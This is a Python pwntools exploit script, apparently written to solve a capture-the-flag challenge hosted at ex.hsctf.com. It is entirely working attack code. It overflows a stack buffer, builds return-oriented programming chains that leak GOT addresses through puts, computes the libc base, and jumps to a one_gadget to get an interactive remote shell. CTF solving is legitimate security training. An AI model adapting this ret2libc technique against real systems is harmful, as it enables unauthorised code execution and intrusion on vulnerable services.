#!/usr/bin/env python3

from pwn import *

exe = ELF("ex")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
def conn():
    return remote("ex.hsctf.com", 1337)
    #return process("./ex")

r = conn()
pop_rdi = 0x00000000004014f3
pop_rsi_r15 = 0x00000000004014f1
restart = 0x401276
got_start = 0x00403ff0
one_gadget = 0xe3afe
setup = 0x0000000000023b63# : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

def enum_libc():
    global got_start
    global r
    for i in range(15):
        payload = b"Q"*40
        payload += p64(pop_rdi)
        payload += p64(got_start)
        payload += p64(exe.plt["puts"])
        payload += p64(restart)
        r.sendline(payload)
        try:
            leak = r.recv(6) + b"\x00\x00"
            if len(leak) != 8:
                got_start += 8
                continue
            leak = u64(leak)
            log.info(f"leaked got @ {hex(got_start)}: {hex(leak)}")
            got_start += 8
            r.close()
            r = conn()
        except:
            got_start += 8
            r.close()
            r = conn()
            

def pwn():
    payload = b"Q"*40
    payload += p64(pop_rdi)
    payload += p64(exe.got["puts"])
    payload += p64(exe.plt["puts"])
    payload += p64(restart)
    r.sendline(payload)
    leak = u64(r.recv(6) + b"\x00\x00")
    libc.address = leak - 0x84420
    log.info(f"libc base addr @ {hex(libc.address)}")
    payload = b"Q"*40
    payload += p64(libc.address + setup)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc.address + one_gadget)
    r.sendline(payload)


#enum_libc()
pwn()

r.interactive()
